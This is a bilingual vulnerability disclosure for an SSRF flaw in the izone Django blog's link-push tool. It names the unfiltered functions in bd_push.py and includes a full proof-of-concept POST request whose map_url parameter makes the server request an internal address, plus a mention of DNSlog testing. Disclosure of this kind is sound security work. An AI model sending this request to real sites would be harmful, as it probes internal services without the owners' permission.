---
tags:
  - 漏洞公开
---
# izone django blog SSRF
*izone django blog服务端请求伪造*
## Environment
*环境*
https://github.com/Hopetree/izone/releases/tag/lts
![[Pasted image 20241024095806.png]]
## Analysis
*分析*
There is a user controllable SSRF vulnerability in the active push function.\\apps\\tool\\apis\\bd_push.py does not securely filter user input through push_urls() and get_urls().
*在主动推送功能中,存在用户可控的SSRF漏洞。\\apps\\tool\\apis\\bd_push.py中push_urls()以及get_urls()对用户的输入并没有安全过滤*
![[Pasted image 20241024082615.png]]
Attackers can customize GET or POST requests to cause SSRF.
*攻击者可以自定义GET或者POST请求造成SSRF*
![[Pasted image 20241024082715.png]]
## Verify
*证实*
![[Pasted image 20241024083601.png]]
```http
POST /tool/baidu-linksubmit-sitemap/ HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 120
Origin: http://127.0.0.1:8000
Connection: close
Cookie: csrftoken=E7JjnejsrYbCZndzQ7z7CDbvPbqL1E5VfOmVT5uINgM8AvJNEPZI6VvmvzHpzVz8; 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

csrfmiddlewaretoken=DngWjg7qXZtGABxHkRmtVWsd18Na7TIUe4TyP7iGjh4cbJ3V8zM4peM4Hw4OFac7&url=1&map_url=http://127.0.0.1:9000
```
DNSlog testing
*DNSlog测试*
![[Pasted image 20241024085251.png]]